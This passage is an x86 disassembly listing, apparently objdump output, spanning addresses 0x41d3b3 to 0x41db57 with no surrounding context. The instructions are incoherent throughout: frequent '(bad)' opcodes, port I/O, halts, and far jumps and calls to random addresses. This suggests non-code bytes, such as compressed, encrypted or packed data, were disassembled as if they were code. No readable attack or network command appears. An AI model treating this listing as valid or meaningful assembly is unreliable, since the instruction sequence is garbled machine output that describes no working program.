  41d3b3:	dec    esp
  41d3b4:	xor    al,0xec
  41d3b6:	mov    edi,0x9e232529
  41d3bb:	cdq    
  41d3bc:	or     eax,0xce9c76b5
  41d3c1:	xchg   esp,eax
  41d3c2:	inc    edi
  41d3c3:	xchg   edi,eax
  41d3c4:	jmp    0x421c42
	...
  41d3d1:	call   0xbef9:0xcff14f56
  41d3d8:	jg     0x41d423
  41d3da:	push   ss
  41d3db:	jecxz  0x41d387
  41d3dd:	outs   dx,BYTE PTR ds:[esi]
  41d3de:	shl    BYTE PTR [ecx+0x14fe977],cl
  41d3e4:	add    BYTE PTR [esi+0x69000003],ch
  41d3ea:	test   al,0x8
  41d3ec:	jb     0x41d3b0
  41d3ee:	xor    BYTE PTR [ebp+0x41a99255],ch
  41d3f4:	xchg   dh,bh
  41d3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3f7:	sti    
  41d3f8:	cdq    
  41d3f9:	call   DWORD PTR [ebx+ebx*1+0x105ce696]
  41d400:	fcomp  QWORD PTR [edi+0x2cc7756d]
  41d406:	ret    
  41d407:	xchg   DWORD PTR [edx+0x7a],edx
  41d40a:	mov    edx,ebp
  41d40c:	out    0x72,eax
  41d40e:	sub    al,0xb0
  41d410:	ds aam 0xd7
  41d413:	test   eax,0xb3c88872
  41d418:	mov    ds,WORD PTR [edx+0x7e]
  41d41b:	inc    edx
  41d41c:	inc    esi
  41d41d:	jmp    0x2c58cbef
  41d422:	mov    bh,0xc6
  41d424:	(bad)  
  41d425:	jmp    FWORD PTR [esp+ebp*2-0x3650ce52]
  41d42c:	mov    cl,0x9b
  41d42e:	test   al,0xa4
  41d430:	aaa    
  41d431:	fsub   QWORD PTR [edx+0x7b]
  41d434:	jmp    0xe2e025ab
  41d439:	cmc    
  41d43a:	div    DWORD PTR [edi]
  41d43c:	fnsave [esi+0x7485bdc]
  41d442:	dec    edi
  41d443:	adc    DWORD PTR [edx+0x6111d51c],0x7e7fdf65
  41d44d:	lea    edi,[eax+0x64]
  41d450:	es std 
  41d452:	xlat   BYTE PTR ds:[ebx]
  41d453:	sub    al,0x84
  41d455:	adc    ah,BYTE PTR [esi]
  41d457:	mov    al,dl
  41d459:	jmp    0x41d471
  41d45b:	int    0x20
  41d45d:	sahf   
  41d45e:	test   DWORD PTR [ecx],eax
  41d460:	and    BYTE PTR [edi],0x25
  41d463:	dec    ecx
  41d464:	cdq    
  41d465:	mov    eax,ds:0x2c70df73
  41d46a:	hlt    
  41d46b:	push   0x4e
  41d46d:	mov    bh,0xf1
  41d46f:	pusha  
  41d470:	xor    ebx,edi
  41d472:	imul   ebp,DWORD PTR [edi],0x4f
  41d475:	imul   ebx
  41d477:	(bad)  
  41d478:	fs add esi,0xffffffa9
  41d47c:	jmp    0x93eb45fe
  41d481:	leave  
  41d482:	leave  
  41d483:	push   ebp
  41d484:	mov    DWORD PTR [edi],edi
  41d486:	sbb    BYTE PTR [eax-0x533b7df1],dl
  41d48c:	je     0x41d494
  41d48e:	mov    cl,0x88
  41d490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d491:	mov    BYTE PTR [ebx+0x54],bh
  41d494:	add    BYTE PTR [ebp+esi*1-0x6d5ebbda],0x6c
  41d49c:	mov    esp,0xcd44274f
  41d4a1:	fld    QWORD PTR [edi-0x21]
  41d4a4:	adc    BYTE PTR [eax-0x27425e7b],al
  41d4aa:	xchg   DWORD PTR [esi+0x13b9bf29],ebp
  41d4b0:	hlt    
  41d4b1:	enter  0x2eb9,0x7c
  41d4b5:	xor    DWORD PTR [eax+0x46],ebx
  41d4b8:	pop    ebx
  41d4b9:	imul   esp,DWORD PTR [esi+0x6e],0x8a04c3f2
  41d4c0:	les    ebp,FWORD PTR [ebx+edx*8]
  41d4c3:	pusha  
  41d4c4:	mov    ebx,0x1b48e17d
  41d4c9:	sub    cl,BYTE PTR [edx+0x70]
  41d4cc:	test   al,0xe3
  41d4ce:	xor    edx,DWORD PTR [esi]
  41d4d0:	sar    BYTE PTR [ebx+0x48],0x78
  41d4d4:	mov    edx,0x4226624
  41d4d9:	mov    bh,0x2
  41d4db:	or     bh,BYTE PTR [esi]
  41d4dd:	daa    
  41d4de:	cmp    BYTE PTR [edx-0x6d],0x83
  41d4e2:	jle    0x41d4eb
  41d4e4:	and    BYTE PTR [ebx-0x7a389b],0x25
  41d4eb:	cmp    eax,0x67ce043f
  41d4f0:	(bad)  
  41d4f1:	je     0x41d4d2
  41d4f3:	rcr    BYTE PTR [ecx+0x485e1ac1],0xda
  41d4fa:	mov    ebx,0x431216eb
  41d4ff:	push   cs
  41d500:	icebp  
  41d501:	inc    edi
  41d502:	scas   al,BYTE PTR es:[edi]
  41d503:	fwait
  41d504:	xlat   BYTE PTR ds:[ebx]
  41d505:	cdq    
  41d506:	adc    dl,dl
  41d508:	int    0xce
  41d50a:	retf   0x3206
  41d50d:	out    dx,al
  41d50e:	lods   eax,DWORD PTR ds:[esi]
  41d50f:	(bad)  
  41d510:	cmp    DWORD PTR [esi],0xffffffd3
  41d513:	inc    esi
  41d514:	dec    ebx
  41d515:	sub    BYTE PTR [ecx+0x28d1fb63],ch
  41d51b:	pop    esi
  41d51c:	add    DWORD PTR [ebp-0x72e86d2e],ebp
  41d522:	fild   DWORD PTR [edi-0x2b]
  41d525:	mov    WORD PTR [eax],gs
  41d527:	outs   dx,DWORD PTR ds:[esi]
  41d528:	sbb    al,0x8b
  41d52a:	in     eax,0xa3
  41d52c:	inc    edi
  41d52d:	cmp    ebp,DWORD PTR [ebp+0x2692989d]
  41d533:	push   ebp
  41d534:	mov    edx,0x50b9fb77
  41d539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d53a:	dec    edi
  41d53b:	out    0x2,al
  41d53d:	push   ds
  41d53e:	xlat   BYTE PTR ds:[ebx]
  41d53f:	pop    eax
  41d540:	cli    
  41d541:	cmp    al,0x45
  41d543:	fstp   QWORD PTR [edx-0x5e]
  41d546:	jp     0x41d56e
  41d548:	imul   ebx,DWORD PTR [ebx-0x7e],0xffffffaa
  41d54c:	call   0x5527:0x240fe7f7
  41d553:	sbb    al,0x85
  41d555:	popa   
  41d556:	ret    0xc275
  41d559:	inc    ebp
  41d55a:	jo     0x41d5d8
  41d55c:	sub    eax,0xb05565e6
  41d561:	and    dl,BYTE PTR [ebx+ecx*4]
  41d564:	push   cs
  41d565:	and    DWORD PTR [ecx+0x61c44318],esp
  41d56b:	push   edi
  41d56c:	ficom  WORD PTR ds:0x33d82f3b
  41d572:	jg     0x92705a0d
  41d578:	sbb    ch,BYTE PTR [ecx-0x74]
  41d57b:	mov    al,ds:0xb7215d46
  41d580:	xor    al,0xb6
  41d582:	pop    edx
  41d583:	enter  0x831d,0x76
  41d587:	daa    
  41d588:	ins    DWORD PTR es:[edi],dx
  41d589:	fwait
  41d58a:	iret   
  41d58b:	inc    eax
  41d58c:	xchg   edx,eax
  41d58d:	test   BYTE PTR es:[ebx],0x90
  41d591:	or     ah,BYTE PTR [esi]
  41d593:	dec    ebp
  41d594:	push   ebp
  41d595:	cmp    BYTE PTR [edx],dl
  41d597:	or     edx,eax
  41d599:	mov    ?,WORD PTR [ebx+edi*4+0x54]
  41d59d:	iret   
  41d59e:	mov    esp,0x56717b3
  41d5a3:	xor    al,0x7f
  41d5a5:	arpl   WORD PTR fs:[edi],bx
  41d5a8:	pop    edx
  41d5a9:	in     eax,0xb6
  41d5ab:	xor    ecx,DWORD PTR [edx+edx*2]
  41d5ae:	mov    al,0xab
  41d5b0:	(bad)  
  41d5b1:	jns    0x41d5f2
  41d5b3:	fstp   st(4)
  41d5b5:	bound  ecx,QWORD PTR [ebp+0x4c]
  41d5b8:	imul   ebx,DWORD PTR [edx-0x131c3a6],0xbb592e06
  41d5c2:	adc    DWORD PTR [ecx-0x42],0x7504ae69
  41d5c9:	mov    ebx,0x5baf492c
  41d5ce:	pop    edx
  41d5cf:	push   eax
  41d5d0:	bound  esi,QWORD PTR [edi]
  41d5d2:	push   esi
  41d5d3:	mov    bh,0xd4
  41d5d5:	cmp    al,0x2c
  41d5d7:	cmp    eax,0x5b96fe1a
  41d5dc:	shr    dh,cl
  41d5de:	dec    edi
  41d5df:	jle    0x41d602
  41d5e1:	cmp    BYTE PTR [eax+0x360f75ee],cl
  41d5e7:	fcomip st,st(2)
  41d5e9:	push   cs
  41d5ea:	jo     0x41d660
  41d5ec:	outs   dx,DWORD PTR ds:[esi]
  41d5ed:	cmp    DWORD PTR [edx-0x1e04b2b],ebp
  41d5f3:	icebp  
  41d5f4:	add    cl,BYTE PTR [esi+0x77a80b23]
  41d5fa:	inc    ebp
  41d5fb:	xchg   esi,eax
  41d5fc:	dec    ebx
  41d5fd:	(bad)  
  41d5fe:	xchg   ebx,eax
  41d5ff:	dec    eax
  41d600:	mov    ebx,0x75a959ed
  41d605:	adc    BYTE PTR [ebx+edi*8-0x74],0xb
  41d60a:	pop    ebx
  41d60b:	addr16 jnp 0x41d610
  41d60e:	xchg   ebx,eax
  41d60f:	test   BYTE PTR [edx+ebx*4],bl
  41d612:	mov    dh,0xa2
  41d614:	adc    BYTE PTR [ebx+0x41],bl
  41d617:	cmp    bh,BYTE PTR [eax+0x45]
  41d61a:	lahf   
  41d61b:	in     eax,dx
  41d61c:	xchg   esi,eax
  41d61d:	push   es
  41d61e:	mov    dh,0x35
  41d620:	cmp    BYTE PTR [ecx+0x35],ch
  41d623:	rol    BYTE PTR [ebp-0xf],1
  41d626:	xor    eax,0xd8e4eef
  41d62b:	add    edx,DWORD PTR [ebp-0x40]
  41d62e:	mov    ds:0x4b21fa9b,al
  41d633:	sbb    al,0xa
  41d635:	xor    esi,DWORD PTR [esi+0x22]
  41d638:	and    eax,0xcffc8bd
  41d63d:	add    BYTE PTR [edi-0x3f],0x17
  41d641:	dec    eax
  41d642:	xchg   edi,eax
  41d643:	or     al,0x4f
  41d645:	push   edx
  41d647:	jp     0x41d67e
  41d649:	nop
  41d64a:	jbe    0x41d5f2
  41d64c:	pop    ebx
  41d64d:	mov    ch,0x95
  41d64f:	sbb    al,0xb
  41d651:	add    bl,BYTE PTR [esi]
  41d653:	dec    edx
  41d654:	fcmovb st,st(3)
  41d656:	add    ebp,0xffffff91
  41d659:	cwde   
  41d65a:	test   DWORD PTR [ecx+0x14],esp
  41d65d:	jle    0x41d666
  41d65f:	test   al,0xa8
  41d661:	xchg   ebx,eax
  41d662:	inc    BYTE PTR [ebx+0x44]
  41d665:	mov    al,0x20
  41d667:	mov    BYTE PTR [edx-0x67],ah
  41d66a:	fisttp WORD PTR [eax]
  41d66c:	mov    WORD PTR [ecx-0x65],?
  41d66f:	cs push ecx
  41d671:	fs loope 0x41d6de
  41d674:	hlt    
  41d675:	jecxz  0x41d699
  41d677:	or     esp,0xee762d99
  41d67d:	sub    ah,BYTE PTR [esp+ebx*1-0x6]
  41d681:	les    edi,FWORD PTR [edi]
  41d683:	imul   ebx,DWORD PTR [ebp-0x72412239],0x5d
  41d68a:	sbb    ecx,DWORD PTR [ecx+0x1c]
  41d68d:	arpl   WORD PTR [eax],bp
  41d68f:	mov    ds:0x6826cc94,eax
  41d694:	sets   BYTE PTR [ecx]
  41d697:	cmp    DWORD PTR [ebp+0x1390cda3],ebp
  41d69d:	in     al,dx
  41d69e:	std    
  41d69f:	dec    esi
  41d6a0:	mov    ds:0x3846eb68,eax
  41d6a5:	(bad)  
  41d6a7:	inc    esp
  41d6a8:	out    0xb8,al
  41d6aa:	jb     0x41d62d
  41d6ac:	add    DWORD PTR [edi-0x1c],eax
  41d6af:	and    DWORD PTR [edx+0x6e],ebp
  41d6b2:	mov    ebp,0xd17c827f
  41d6b7:	xor    BYTE PTR [edx+0x6],dh
  41d6ba:	push   esi
  41d6bb:	cmp    al,0xa2
  41d6bd:	fstp   QWORD PTR [ecx-0x20]
  41d6c0:	push   es
  41d6c1:	cmc    
  41d6c2:	aam    0xa7
  41d6c4:	jmp    0xf812:0x70e4a792
  41d6cb:	loopne 0x41d6fd
  41d6cd:	push   ss
  41d6ce:	ror    DWORD PTR [edi],1
  41d6d0:	outs   dx,DWORD PTR ds:[esi]
  41d6d1:	jmp    0x4d06eb84
  41d6d6:	push   ebx
  41d6d7:	aas    
  41d6d8:	jp     0x41d6b8
  41d6da:	ins    BYTE PTR es:[edi],dx
  41d6db:	cmp    ah,0x8e
  41d6de:	sub    BYTE PTR [esi+0x57],ch
  41d6e1:	lahf   
  41d6e2:	inc    eax
  41d6e3:	mov    eax,ds:0x950fcdea
  41d6e8:	sub    BYTE PTR [ecx],dh
  41d6ea:	sub    eax,0xecce4180
  41d6ef:	push   ebx
  41d6f0:	pusha  
  41d6f1:	push   ecx
  41d6f2:	outs   dx,DWORD PTR ds:[esi]
  41d6f3:	or     dl,bh
  41d6f5:	jo     0x41d6be
  41d6f7:	mov    esi,ss
  41d6f9:	xchg   edi,eax
  41d6fa:	fs aam 0x1d
  41d6fd:	pop    ebx
  41d6fe:	in     eax,0x9b
  41d700:	dec    esi
  41d701:	fst    DWORD PTR [edi-0x4f085492]
  41d707:	jp     0x41d75b
  41d709:	clc    
  41d70a:	jmp    0x9d95:0x883a7bc2
  41d711:	jmp    0x41d75b
  41d713:	sbb    eax,0x5ae6e11c
  41d719:	and    dl,dh
  41d71b:	sbb    eax,0xf4ce9ceb
  41d720:	aas    
  41d721:	cld    
  41d722:	rcr    BYTE PTR [ecx+0x1e],0x3d
  41d726:	dec    edx
  41d727:	and    DWORD PTR [eax],ebp
  41d729:	retf   0xcdee
  41d72c:	xchg   ebx,eax
  41d72d:	(bad)  
  41d72e:	sub    al,0x92
  41d730:	adc    al,0x7f
  41d732:	mov    ebp,0xa0fac350
  41d737:	push   esi
  41d738:	xor    edi,ebx
  41d73a:	mov    DWORD PTR [ecx+edi*8+0x7e],esp
  41d73e:	dec    DWORD PTR [ebp+edx*2+0x2c]
  41d742:	inc    ecx
  41d743:	cmp    edx,edx
  41d745:	push   eax
  41d746:	mov    ecx,0xed3902ce
  41d74b:	push   eax
  41d74c:	or     dl,BYTE PTR [ecx+0x59566b34]
  41d752:	inc    eax
  41d753:	push   ss
  41d754:	ja     0x41d722
  41d756:	mov    BYTE PTR [esi+0x7dd7d4cd],al
  41d75c:	ret    
  41d75d:	jb     0x41d7b0
  41d75f:	je     0x41d72f
  41d761:	aad    0x8d
  41d763:	pop    es
  41d764:	retf   
  41d765:	test   DWORD PTR [eax-0xf],eax
  41d768:	mov    al,ds:0x2d737d2c
  41d76d:	and    BYTE PTR [ebx+esi*8+0x316be2f6],dl
  41d774:	loopne 0x41d75a
  41d776:	fs leave 
  41d778:	dec    ecx
  41d779:	push   esi
  41d77a:	push   es
  41d77b:	sbb    eax,0xac3343df
  41d780:	ins    BYTE PTR es:[edi],dx
  41d781:	xchg   ebx,eax
  41d782:	xlat   BYTE PTR ds:[ebx]
  41d783:	xchg   ebx,eax
  41d784:	ds aaa 
  41d786:	call   0x4be9:0xdf48929e
  41d78d:	mov    eax,ds:0x530e985b
  41d792:	jecxz  0x41d80b
  41d794:	ret    
  41d795:	(bad)  [ebx+0x0]
  41d79b:	add    BYTE PTR [eax],al
  41d79d:	add    BYTE PTR [eax],al
  41d79f:	add    BYTE PTR [eax],al
  41d7a1:	cld    
  41d7a2:	xlat   BYTE PTR ds:[ebx]
  41d7a3:	dec    esp
  41d7a4:	call   0xd83ed318
  41d7a9:	adc    BYTE PTR [ecx+0x432c13a2],ah
  41d7af:	mov    BYTE PTR [ebp+0x15397],0xae
  41d7b6:	add    eax,DWORD PTR [eax]
  41d7b8:	add    al,al
  41d7ba:	(bad)  
  41d7bc:	(bad)  
  41d7bd:	pop    edx
  41d7be:	pop    esp
  41d7bf:	jb     0x41d7eb
  41d7c1:	inc    ecx
  41d7c2:	outs   dx,DWORD PTR ds:[esi]
  41d7c3:	dec    edx
  41d7c4:	cmp    dl,bl
  41d7c6:	rcr    DWORD PTR [ecx+0x10],0x61
  41d7ca:	repz fild DWORD PTR ds:0x2d5ba0a3
  41d7d1:	mov    ebp,0xa6ce9ae5
  41d7d6:	fwait
  41d7d7:	pop    esp
  41d7d8:	adc    ah,BYTE PTR [esi+ebx*1-0x13]
  41d7dc:	sbb    al,0x13
  41d7de:	loopne 0x41d7d3
  41d7e0:	mov    bl,BYTE PTR ds:0xcf01c09a
  41d7e6:	mov    esi,0x76b50127
  41d7eb:	jecxz  0x41d831
  41d7ed:	jecxz  0x41d7ea
  41d7ef:	cwde   
  41d7f0:	mov    ch,0x5d
  41d7f2:	in     al,0x36
  41d7f4:	arpl   WORD PTR [edi+0x28],bp
  41d7f7:	mov    bl,0x42
  41d7f9:	test   al,0x91
  41d7fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7fc:	mov    ds:0xd64cd9d,al
  41d801:	dec    edi
  41d802:	adc    eax,edx
  41d804:	dec    esi
  41d805:	fild   WORD PTR [edi]
  41d807:	mov    BYTE PTR [ebp+0x2a],ah
  41d80a:	inc    edx
  41d80b:	sbb    eax,0xe95a7551
  41d810:	jp     0x41d848
  41d812:	mov    edi,0x95d44561
  41d817:	xlat   BYTE PTR ds:[ebx]
  41d818:	jmp    0x7bec:0x324a1c4
  41d81f:	fistp  QWORD PTR [ecx-0xf131fe2]
  41d825:	mov    esp,0xbffb7a4c
  41d82a:	sbb    DWORD PTR [ebp+0x76],0x34827fd2
  41d831:	sub    al,0x98
  41d833:	out    dx,eax
  41d834:	jmp    0x41d7c9
  41d836:	cmp    ah,BYTE PTR [edi+0x6d264208]
  41d83c:	leave  
  41d83d:	mov    ebx,0x23909e6e
  41d842:	loopne 0x41d879
  41d844:	xor    al,0x4c
  41d846:	mov    bl,0x49
  41d848:	ss repz jo 0x41d8b8
  41d84c:	mov    edx,DWORD PTR [edx]
  41d84e:	cmp    al,0xbe
  41d850:	pop    ecx
  41d851:	adc    DWORD PTR [ebp-0x6c],0xbe939b56
  41d858:	dec    ebp
  41d859:	sbb    bh,al
  41d85b:	dec    edi
  41d85c:	add    BYTE PTR [ebp+ebx*2+0x7c8aa4fe],ah
  41d863:	dec    esi
  41d864:	sub    ebp,DWORD PTR [edx+0x9be28b6]
  41d86a:	(bad)
  41d86d:	pop    ebp
  41d86e:	mul    BYTE PTR [ecx-0x7a]
  41d871:	pop    ss
  41d872:	ins    BYTE PTR es:[edi],dx
  41d873:	inc    esi
  41d874:	push   esi
  41d875:	out    0x9,al
  41d877:	imul   ebx,ebp,0xec65c87c
  41d87d:	out    dx,al
  41d87e:	sbb    BYTE PTR [edi+0x7f],cl
  41d881:	imul   ebp,esi,0xffffffaf
  41d884:	fsub   st(5),st
  41d886:	call   0x459e:0x349e1cf0
  41d88d:	xchg   DWORD PTR [ebp+0x689c92b3],ebx
  41d893:	xchg   BYTE PTR [ebx],bl
  41d895:	xor    al,BYTE PTR [esi+eiz*4]
  41d898:	mov    esp,0xe79009be
  41d89d:	loop   0x41d855
  41d89f:	push   ebx
  41d8a0:	jns    0x41d83b
  41d8a2:	mov    DWORD PTR [ebp-0x16536c3c],esp
  41d8a8:	enter  0x949a,0x57
  41d8ac:	lods   eax,DWORD PTR ds:[esi]
  41d8ad:	rcl    BYTE PTR [ecx-0x6c],1
  41d8b0:	mov    dh,0xa7
  41d8b2:	adc    ebp,DWORD PTR [edx]
  41d8b4:	xchg   edx,eax
  41d8b5:	dec    edi
  41d8b6:	fsub   DWORD PTR [esi-0x6c1f8ca4]
  41d8bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8bd:	leave  
  41d8be:	and    al,0x49
  41d8c0:	ret    
  41d8c1:	sub    al,0xbd
  41d8c3:	sbb    BYTE PTR [edx+edx*4+0x10a758a],0xf
  41d8cb:	aam    0x54
  41d8cd:	and    ebx,DWORD PTR [edx]
  41d8cf:	mov    esi,0x25dcd08f
  41d8d4:	cmp    ch,BYTE PTR [esi-0x27cc60f0]
  41d8da:	psubsb mm4,QWORD PTR [edx-0x6923ee43]
  41d8e1:	mov    ecx,0xd8515ea
  41d8e6:	imul   eax,DWORD PTR [ecx-0x5e9ec16],0xf85f1453
  41d8f0:	fsub   DWORD PTR [edi+0x12]
  41d8f3:	push   es
  41d8f4:	xchg   esi,eax
  41d8f5:	jne    0x41d90c
  41d8f7:	pop    eax
  41d8f8:	mov    ebx,ebp
  41d8fa:	dec    edi
  41d8fb:	and    al,0x41
  41d8fd:	push   edx
  41d8fe:	push   ecx
  41d8ff:	popa   
  41d900:	in     al,0x70
  41d902:	dec    ecx
  41d903:	cmp    BYTE PTR [ebx-0x49aa0eeb],0x19
  41d90a:	leave  
  41d90b:	xchg   esi,eax
  41d90c:	out    dx,eax
  41d90d:	mov    ds:0xcc43dde,al
  41d912:	add    al,0x1c
  41d914:	leave  
  41d915:	out    dx,eax
  41d916:	add    ebp,ebx
  41d918:	or     BYTE PTR [ecx+0x359dfd2e],cl
  41d91e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d91f:	ss pop edi
  41d921:	in     eax,dx
  41d922:	mov    BYTE PTR [ebp-0xa1c3efb],cl
  41d928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d929:	xor    cl,cl
  41d92b:	push   ecx
  41d92c:	scas   eax,DWORD PTR es:[edi]
  41d92d:	pop    ebp
  41d92e:	xchg   ebx,eax
  41d92f:	hlt    
  41d930:	pop    esi
  41d931:	push   eax
  41d932:	aam    0xb4
  41d934:	loop   0x41d975
  41d936:	sbb    al,0x4e
  41d938:	outs   dx,DWORD PTR ds:[esi]
  41d939:	(bad)  
  41d93a:	cmp    eax,0x931f98eb
  41d93f:	mov    bh,0x28
  41d941:	test   al,0xc2
  41d943:	in     al,dx
  41d944:	cli    
  41d945:	pop    ss
  41d946:	and    DWORD PTR [edi],ebx
  41d948:	add    esi,DWORD PTR [edi+0x2]
  41d94b:	cmp    al,0x70
  41d94d:	cmp    DWORD PTR [edi],eax
  41d94f:	and    eax,0xfd3b3513
  41d954:	or     ebx,DWORD PTR [esi]
  41d956:	add    al,0x4d
  41d958:	ror    BYTE PTR [ecx],1
  41d95a:	ds ret 0x43e4
  41d95e:	xchg   edx,eax
  41d95f:	xor    eax,0xb73be06b
  41d964:	sbb    DWORD PTR [edx+0xa],0xffffffab
  41d968:	mov    BYTE PTR ds:0x265b9a6d,dl
  41d96e:	mov    ah,0x77
  41d970:	aam    0x2f
  41d972:	xchg   ebp,eax
  41d973:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d975:	and    eax,0x1a79153a
  41d97a:	adc    esi,DWORD PTR [edi]
  41d97c:	mul    BYTE PTR [ebx]
  41d97e:	and    esi,DWORD PTR [esi-0x7865de0f]
  41d984:	mov    dh,0x8
  41d986:	pop    edx
  41d987:	adc    BYTE PTR ds:0xc02c264b,0x75
  41d98e:	sti    
  41d98f:	inc    eax
  41d990:	in     al,0x2c
  41d992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d993:	aam    0x68
  41d995:	gs addr16 dec esp
  41d998:	out    dx,al
  41d999:	popa   
  41d99a:	xchg   esi,eax
  41d99b:	pop    ecx
  41d99c:	out    dx,eax
  41d99d:	popa   
  41d99e:	cwde   
  41d99f:	out    0x2a,eax
  41d9a1:	mov    bh,0xd
  41d9a3:	mov    ecx,0x446527cc
  41d9a8:	test   DWORD PTR [edx-0x7d],0x94ecdfba
  41d9af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9b0:	call   0xc8a650c6
  41d9b5:	mul    BYTE PTR [edx+0x549d08e6]
  41d9bb:	push   esi
  41d9bc:	int3   
  41d9bd:	mov    ss,WORD PTR fs:[eax-0x5f8411f7]
  41d9c4:	in     al,0xd6
  41d9c6:	pop    edx
  41d9c7:	inc    edx
  41d9c8:	les    ebx,FWORD PTR [eax+0x63]
  41d9cb:	xchg   ebx,eax
  41d9cc:	fst    QWORD PTR [ecx]
  41d9ce:	mov    ebx,0xb3f6a407
  41d9d3:	or     eax,0xcb6f669d
  41d9d8:	push   esi
  41d9d9:	mov    edx,0x6dcbd227
  41d9de:	out    dx,eax
  41d9df:	retf   
  41d9e0:	lods   al,BYTE PTR ds:[esi]
  41d9e1:	or     BYTE PTR [edx],0x6b
  41d9e4:	aad    0x14
  41d9e6:	ins    BYTE PTR es:[edi],dx
  41d9e7:	cmp    BYTE PTR [esi+0x36c1debb],cl
  41d9ed:	push   ebp
  41d9ee:	push   eax
  41d9ef:	push   0x407534e
  41d9f4:	mov    ecx,0x8a62865f
  41d9f9:	and    esi,DWORD PTR [ebx+0x3e]
  41d9fc:	mov    eax,0xa3d875a
  41da01:	cs aam 0xc3
  41da04:	sar    bh,1
  41da06:	lods   al,BYTE PTR ds:[esi]
  41da07:	popa   
  41da08:	mov    ah,0x61
  41da0a:	and    ecx,ecx
  41da0c:	xor    DWORD PTR [eax-0x79b411f2],esi
  41da12:	out    0xa,al
  41da14:	inc    esp
  41da15:	loope  0x41da6c
  41da17:	xchg   esp,eax
  41da18:	rcr    BYTE PTR [edx-0x4ef243da],1
  41da1e:	cmp    BYTE PTR es:[ecx],0x20
  41da22:	adc    dl,BYTE PTR [esi]
  41da24:	std    
  41da25:	bnd call 0xd69ab89b
  41da2b:	ret    0xe1ae
  41da2e:	mov    ds:0xf8d358bc,al
  41da33:	xchg   ebx,eax
  41da34:	jnp    0x41da92
  41da36:	popa   
  41da37:	mov    ah,0x21
  41da39:	pop    eax
  41da3a:	pushf  
  41da3b:	test   al,0x5e
  41da3d:	mov    dh,0x53
  41da3f:	jmp    0x430e3cbe
  41da44:	pop    ecx
  41da45:	aam    0x51
  41da47:	es jp  0x41da15
  41da4a:	cld    
  41da4b:	sbb    DWORD PTR [edx+ebx*8+0x3],ebx
  41da4f:	sub    al,0xc9
  41da51:	pop    ebx
  41da52:	push   esi
  41da53:	xchg   ebx,eax
  41da54:	push   ds
  41da55:	popf   
  41da56:	and    eax,0xd5cbd472
  41da5b:	scas   eax,DWORD PTR es:[edi]
  41da5c:	push   ebp
  41da5d:	mov    bh,0x23
  41da5f:	xor    BYTE PTR [edi+0x2f],ch
  41da62:	mov    ecx,DWORD PTR [eax+ebp*2+0x7f]
  41da66:	inc    ebp
  41da67:	lods   al,BYTE PTR ds:[esi]
  41da68:	mov    al,0xd5
  41da6a:	in     al,0x47
  41da6c:	ja     0x41dac7
  41da6e:	mov    esi,0x10696fe1
  41da73:	gs aad 0xd9
  41da76:	and    dl,BYTE PTR [ebx+0x197da8a5]
  41da7c:	xchg   ebx,eax
  41da7d:	mov    edx,DWORD PTR [esi+0x5a]
  41da80:	and    BYTE PTR [ecx-0x69],ah
  41da83:	adc    edx,esp
  41da85:	or     DWORD PTR [ecx],0xf03851b3
  41da8b:	repnz stc 
  41da8d:	out    dx,eax
  41da8e:	aam    0x75
  41da90:	inc    esi
  41da91:	ds jbe 0x41da54
  41da94:	(bad)  
  41da95:	adc    ch,dh
  41da97:	jl     0x41db0c
  41da99:	dec    esi
  41da9a:	cmp    ch,BYTE PTR [ebx+0x4883d71]
  41daa0:	rcl    BYTE PTR [ecx],0xf8
  41daa3:	icebp  
  41daa4:	add    DWORD PTR [edi+0x79],eax
  41daa7:	call   0x13014c86
  41daac:	pusha  
  41daad:	mov    esi,0x4b905aba
  41dab2:	les    eax,FWORD PTR [esi+0x723405cf]
  41dab8:	adc    eax,0x5641a97
  41dabd:	push   edi
  41dabe:	out    dx,al
  41dabf:	push   ds
  41dac0:	js     0x41da73
  41dac2:	ds dec edi
  41dac4:	nop
  41dac5:	mov    ds:0xf15ea07c,eax
  41daca:	imul   ebp,DWORD PTR [ecx+0x33],0xcf7ff336
  41dad1:	or     al,0x79
  41dad3:	and    al,0xc1
  41dad5:	add    al,BYTE PTR ds:0x29e0dd42
  41dadb:	jbe    0xcff5e069
  41dae1:	scas   al,BYTE PTR es:[edi]
  41dae2:	jae    0x41db59
  41dae4:	test   BYTE PTR [ecx-0x8a89076],dl
  41daea:	xchg   ebx,eax
  41daeb:	enter  0x5759,0xc9
  41daef:	mov    al,ds:0xa0b79e69
  41daf4:	cwde   
  41daf5:	pop    esp
  41daf6:	in     eax,0x77
  41daf8:	js     0x41da9e
  41dafa:	out    dx,al
  41dafb:	sub    ch,bl
  41dafd:	or     esp,DWORD PTR [ecx-0x2d]
  41db00:	jmp    0x3b84:0xad7f194
  41db07:	sub    al,0x5e
  41db09:	mov    ch,0xcf
  41db0b:	mov    ds:0x48b1e8d1,al
  41db10:	call   0xbb690c9f
  41db15:	and    BYTE PTR [ebx],al
  41db17:	sahf   
  41db18:	jae    0x41da9a
  41db1a:	fnstenv [edx]
  41db1c:	out    dx,eax
  41db1d:	test   edi,edx
  41db1f:	(bad)  
  41db20:	out    dx,al
  41db21:	and    DWORD PTR [ecx-0x62],ebx
  41db24:	lods   al,BYTE PTR ds:[esi]
  41db25:	xchg   esi,eax
  41db26:	mov    bl,0xc7
  41db28:	fnstenv [ebp+0x62d1e2a0]
  41db2e:	xchg   esp,eax
  41db2f:	inc    edi
  41db30:	sar    BYTE PTR [ebx+ecx*2],0x27
  41db34:	dec    ecx
  41db35:	les    eax,FWORD PTR [ecx+0x2e]
  41db38:	dec    esi
  41db39:	and    esi,DWORD PTR [ecx-0x31e4ca7a]
  41db3f:	push   ecx
  41db40:	inc    ebp
  41db41:	adc    DWORD PTR [edx-0x5e],ecx
  41db44:	xchg   BYTE PTR ds:0x874aa4df,bh
  41db4a:	aam    0x94
  41db4c:	int3   
  41db4d:	ins    DWORD PTR es:[edi],dx
  41db4e:	push   ds
  41db4f:	sub    eax,0xc0f4abda
  41db54:	ss or  al,0xe6
  41db57:	out    0xc,al
